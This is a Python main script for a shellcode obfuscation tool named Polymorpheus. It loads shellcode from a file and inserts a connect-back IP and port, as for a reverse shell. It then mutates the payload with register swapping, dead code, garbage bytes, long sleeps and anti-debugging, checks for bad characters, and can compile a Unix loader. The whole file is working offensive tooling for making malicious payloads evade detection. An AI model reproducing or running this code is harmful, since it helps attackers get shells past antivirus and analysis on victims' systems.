from modules.register_swap import *
from modules.dead_code import *
from modules.logic_swap import *
from modules.garbage_jump import *
from modules.long_sleep import *
from modules.anti_debug import *
from essentials import * #All the modules import from the main file's directory automatically, so there is no need to place this in modules
#from encryption import * # Work in progress

import compilers.win as wincomp #Use xor to avoid bad chars
import compilers.unix as unicomp #Use mmap to allocate better and use xor

import sys

from random import randint #Temporary

def print_help():
    print("Polymorpheus\n")
    print("Syntax:")
    #print("-s: Register Swap (\x1b[4mEXPERIMENTAL\x1b[0m)")
    print("-x: Register Swap (\x1b[4mEXPERIMENTAL\x1b[0m)")
    print("-r: Logic replacement")
    print("-d: Dead code insertion")
    print("-g: Garbage byte insertion")
    print("-l: Long sleep")
    print("-a: Anti debugging features")
    print("-v: Verbose mode, must be last argument")
    print("\nTo specify an IPv4 address to connect to, include IP= as a command-line argument, and use IP as your ip address placeholder in shellcode.txt")
    print("To specify a port to connect to, include PORT=, use PORT as your port placeholder in shellcode.txt\n")
    print("Example: python3 main.py -rdgl IP=127.0.0.1 PORT=4444 -v\n")
    print("Shellcode.txt syntax:\nLine 1: Arch(32 or 64)\nLine 2: Shellcode here, with or without \" or newlines")
    print("\nThis script only works on 32-bit or 64-bit intel architectures at the moment")


def findBetweenEach(string:str, phrase:str) -> list:
    returnable:list = []
    for i in range(0, len(findall_regular(string, phrase)), 2):#update it to get rid of the " and anything outside of it
        returnable.append(string[findall_regular(string, phrase)[i]:findall_regular(string, phrase)[i+1]])
    #For each pair, add a list between each instance
    #If odd, ignore it
    if returnable ==[]:
        returnable = [string]
    return returnable

def get_file(file_marker:int) -> str:
    file_name=""
    try:
        sys.argv[file_marker+1]
    except IndexError:
        print("[-] Shellcode file not specified, using default shellcode.txt")
        file_name = "shellcode.txt"
        return file_name
    if sys.argv[file_marker]=="--file" or sys.argv[file_marker]=="-f":
        try:
            file_name=sys.argv[file_marker+1]
            with open(file_name) as f:
                pass
        except FileNotFoundError:
            print("Invalid Shellcode File")
            exit()
    else:
        print("[-] Shellcode file not specified, using default shellcode.txt")
        file_name = "shellcode.txt"
    return file_name


def ipv4_validate(ipv4:str) -> str:
    ip_str:str = ""
    try:
        for i in (lst:=ipv4.split('.')):
            i_int:int = int(i)
            if i_int<0 or i_int>255 or len(lst)!=4:
                raise ValueError
            ip_str = r'\x'+ "%02x"%i_int + ip_str #Little Endian
    except ValueError:
        print("Invalid IPv4 address")
        exit()
    return ip_str

def port_validate(port:str) -> str:
    try:
        if int(port)<0 or int(port)>65535:
            raise ValueError
        port_hex:str = "%04x"%int(port)
        port_hex:str = r"\x"+port_hex[-2:]+r"\x"+port_hex[0:2]
    except ValueError:
        print("Invalid port")
        exit()
    return port_hex

def check_ip_args():
    ip:str = ""
    port:str = ""
    for i in sys.argv: #Consider using re
        if "ip=" in i.lower():
            ip = i[i.find('=')+1:]
            ip = ipv4_validate(ip)
            continue
        if "port=" in i.lower():
            port = i[i.find('=')+1:] 
            port = port_validate(port)
            continue
    return ip, port

def set_host_conn(shellcode:str) -> str:
    ip, port = check_ip_args()
    shellcode = shellcode.replace("IP", ip)
    shellcode = shellcode.replace("PORT", port)
    return shellcode

#Remember to come here if you get an assembly error
def loadShellcodeFromFile(fileName:str) -> Shellcode: #meterpreter is too large
    #Line 1 is marked by arch: either 32 or 64
    actual_code = "" #Could be bytes
    codeBeginsLine = 1
    arch:int = 32
    is64 = False
    try:
        with open(fileName, 'r') as ShellcodeFile:
            for line in ShellcodeFile.readlines():#[codeBeginsLine:]:
                actual_code += findBetweenEach(line, '"')[0].replace('"', "")
            arch = int(actual_code.split("\n")[0])
            if(arch==64):
                is64 = True
            actual_code = actual_code[len(actual_code.split("\n")[0]):]
            if "IP" in actual_code or "PORT" in actual_code:
                actual_code = set_host_conn(actual_code)
    except FileNotFoundError:
        print("Shellcode.txt not found, please make one and put it in the local directory")
        exit()
    return Shellcode(actual_code, is64)
    
def verify_flags(argv_start):
    valid_flags:list[str] = ['d', 'r', 'g', 'l', 'a', 'x']
    return False if sys.argv[argv_start][0] != '-' else all(flag in valid_flags for flag in sys.argv[argv_start][1:])

def main() -> None:
    args_present = True
    try:
        sys.argv[1]
    except IndexError:
        args_present = False

    if not args_present:
        print_help()
        exit()
    
    verbose:bool = False
    if 'v' in sys.argv[-1]:
        verbose = True

    argv_start:int = 1

    shellcode_file = get_file(argv_start+1)
    code:Shellcode = loadShellcodeFromFile(shellcode_file)

    if code.is_64_bit():
        instructions = Shellcode.disassemble64(code.getCode())
    else:
        instructions = Shellcode.disassemble(code.getCode()) 

    if args_present:
        if(not verify_flags(argv_start)):
            print("Invalid Arguments")
            print_help()
            return

        code:Shellcode = loadShellcodeFromFile("shellcode.txt")
        if code.is_64_bit():
            instructions = Shellcode.disassemble64(code.getCode())
        else:
            instructions = Shellcode.disassemble(code.getCode())

        instructions = Shellcode.fixBadMnemonics(instructions)
        instructions = code.fixJumpErrors(instructions, code.getCode())  #Remember positive loops

        #Add a verbose option
        if verbose:
            print(f"\nOriginal Instructions: \n{instructions}")

        jumpIndexesOffset = code.findJump(instructions) 
        code.getRelativeJmpOffset(instructions, jumpIndexesOffset) 

        code.findJumpTargetsRelative(instructions)
        updatedInstr = instructions 

        code.get_subroutines(updatedInstr)

        if "l" in sys.argv[1]:
            updatedInstr = code.long_sleep(updatedInstr)
        if "d" in sys.argv[1]:
            updatedInstr = code.addDeadCode(updatedInstr)
        if "r" in sys.argv[1]:
            updatedInstr = code.logic_replacement(updatedInstr)
        if "x" in sys.argv[1]:
            print("[\x1b[93m!\x1b[0m] \x1b[93mWARNING: You are using an experimental feature. Your shellcode may not work as intended\x1b[0m")
            updatedInstr = code.registerSwap(updatedInstr)

        if 'a' in sys.argv[1]:
            updatedInstr = code.anti_trap(updatedInstr)
        if 'g' in sys.argv[1]:
            code.insert_garbage(updatedInstr)
        else:
            if code.is_64_bit():
                code.shellcode = Shellcode.assemble64(updatedInstr)
            else:
                code.shellcode = Shellcode.assemble(updatedInstr)

        if len(sys.argv)>=3:
            if 'w' in sys.argv[2]:
                print("Windows Compiler functionality will be added soon")
            if 'u' in sys.argv[2]:
                unicomp.compile(64 if code.is_64 else 32,code.string)

        #Verbose option here
        if verbose:
            print(f"\nUpdated Instructions:\n{updatedInstr}\n")
        print(f"\nNew Shellcode:\n{code.string}")
        if contains_bad_chars(code.string):
            print("\n[\x1b[93m!\x1b[0m] \x1b[93mWarning: Shellcode contains bad characters\x1b[0m")
            code.print_badchar_info()
        print(f"\nShellcode Length: {code.length} | {hex(code.length)} bytes")
    else:
        print_help()

if __name__=="__main__":
    main()
